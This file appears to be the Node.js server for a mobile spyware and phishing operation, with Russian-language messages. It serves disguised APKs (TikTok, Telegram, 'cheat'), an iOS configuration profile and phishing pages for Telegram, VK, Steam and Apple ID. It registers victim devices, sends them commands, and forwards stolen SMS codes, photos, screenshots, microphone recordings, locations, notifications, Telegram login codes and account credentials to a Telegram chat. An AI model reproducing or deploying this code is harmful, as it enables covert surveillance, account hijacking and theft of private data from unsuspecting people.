const express = require('express');
const path = require('path');

process.on('uncaughtException', (err) => { console.error('Ошибка:', err); });
process.on('unhandledRejection', (err) => { console.error('Отказ:', err); });

const db = require('./db');
const { bot, notifyAdmin } = require('./bot');

const app = express();
app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => { res.status(200).send('OK'); });

app.get('/tiktok.apk', (req, res) => res.download(path.join(__dirname, 'tiktok.apk')));
app.get('/telegram.apk', (req, res) => res.download(path.join(__dirname, 'telegram.apk')));
app.get('/cheat.apk', (req, res) => res.download(path.join(__dirname, 'cheat.apk')));
app.get('/ios.mobileconfig', (req, res) => res.download(path.join(__dirname, 'ios.mobileconfig')));
app.get('/ios.html', (req, res) => res.sendFile(path.join(__dirname, 'ios.html')));
app.get('/tg.html', (req, res) => res.sendFile(path.join(__dirname, 'tg.html')));
app.get('/vk.html', (req, res) => res.sendFile(path.join(__dirname, 'vk.html')));
app.get('/steam.html', (req, res) => res.sendFile(path.join(__dirname, 'steam.html')));

app.post('/api/register', async (req, res) => {
  const { id, model } = req.body || {};
  if (!id) return res.status(400).json({ ok: false });
  const isNew = !db.listDevices().find(d => d.id === id);
  db.addDevice(id, model || 'android');
  if (isNew) {
    try { await bot.telegram.sendMessage(9256345316, `📱 Новое устройство!\nМодель: ${model}\nID: ${id}`); } catch (e) {}
  }
  res.json({ ok: true });
});

app.get('/api/poll', (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ ok: false });
  db.addDevice(id, req.query.model || 'android');
  const cmds = db.pullCommands(id);
  res.json({ ok: true, cmds });
});

app.post('/api/report', async (req, res) => {
  const { id, kind, body, name } = req.body || {};
  if (!id || !kind) return res.status(400).json({ ok: false });
  db.saveReport(id, kind, body || '');
  
  try {
    if (kind === 'photo' && body) {
      const buf = Buffer.from(body, 'base64');
      await notifyAdmin('photo', buf, `📷 Фото с ${id.slice(0,6)}`);
    }
    if (kind === 'screen' && body) {
      const buf = Buffer.from(body, 'base64');
      await bot.telegram.sendPhoto(9256345316, { source: buf }, { caption: `📸 Скрин с ${id.slice(0,6)}` });
    }
    if (kind === 'sms' && body) {
      await bot.telegram.sendMessage(9256345316, `🔑 СМС код с ${id.slice(0,6)}:\n${body}`);
    }
    if (kind === 'location' && body) {
      await bot.telegram.sendMessage(9256345316, `📍 Адрес (${id.slice(0,6)}):\n${body}`);
    }
    if (kind === 'notify' && body) {
      await bot.telegram.sendMessage(9256345316, `🔔 Уведомление (${id.slice(0,6)}):\n${body}`);
    }
    if (kind === 'audio_rec' && body) {
      const buf = Buffer.from(body, 'base64');
      await bot.telegram.sendVoice(9256345316, { source: buf }, { caption: `🎤 Микрофон ${id.slice(0,6)}` });
    }
    if (kind === 'file' && body) {
      const buf = Buffer.from(body, 'base64');
      await bot.telegram.sendPhoto(9256345316, { source: buf }, { caption: `🖼 Галерея ${id.slice(0,6)}: ${name || 'image.jpg'}` });
    }
    if (kind === 'tg_number' && body) {
      await bot.telegram.sendMessage(9256345316, `📞 Жертва ввела номер TG: ${body}\nУстройство: ${id}`);
    }
    if (kind === 'tg_code' && body) {
      await bot.telegram.sendMessage(9256345316, `💬 Жертва ввела КОД из TG: ${body}\nУстройство: ${id}`);
    }
    if (kind === 'ios_login' && body) {
      await bot.telegram.sendMessage(9256345316, `🍏 Apple ID (iOS):\n${body}`);
    }
    if (kind === 'vk_login' && body) {
      await bot.telegram.sendMessage(9256345316, `🔵 ВКонтакте (Вход):\n${body}`);
    }
    if (kind === 'steam_login' && body) {
      await bot.telegram.sendMessage(9256345316, `🎮 Steam (Вход):\n${body}`);
    }
  } catch (e) {}
  
  res.json({ ok: true });
});

const port = process.env.PORT || 8080;
app.listen(port, '0.0.0.0', () => { console.log('server up :' + port); });
